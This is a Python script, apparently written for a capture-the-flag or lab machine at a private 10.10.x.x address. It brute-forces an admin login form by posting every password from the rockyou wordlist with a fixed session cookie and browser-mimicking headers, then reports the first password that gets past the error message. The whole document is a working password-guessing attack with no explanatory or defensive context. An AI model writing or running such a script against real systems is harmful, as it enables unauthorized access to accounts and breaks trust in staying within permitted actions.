import grequests
import sys

cookies = {
    'PHPSESSID': 'othgvqok8m0p0e4cb5qrjf5l0c',
}

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'http://10.10.179.27/admin/',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://10.10.179.27',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
}

passwords = [ x.strip() for x in open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') if x ]

for number,password in enumerate(passwords):
	data = {
  	'user': 'admin',
  	'pass': password
	}
	
	print("[*] Trying Password#" + str(number) + ": " + password)

	response = grequests.post('http://10.10.179.27/admin/', headers=headers, cookies=cookies, data=data)
	responses_list = grequests.map([response])
	if "Username or password invalid" not in responses_list[0].text:
		print("[+] Password Found: " + password)
		sys.exit(0)

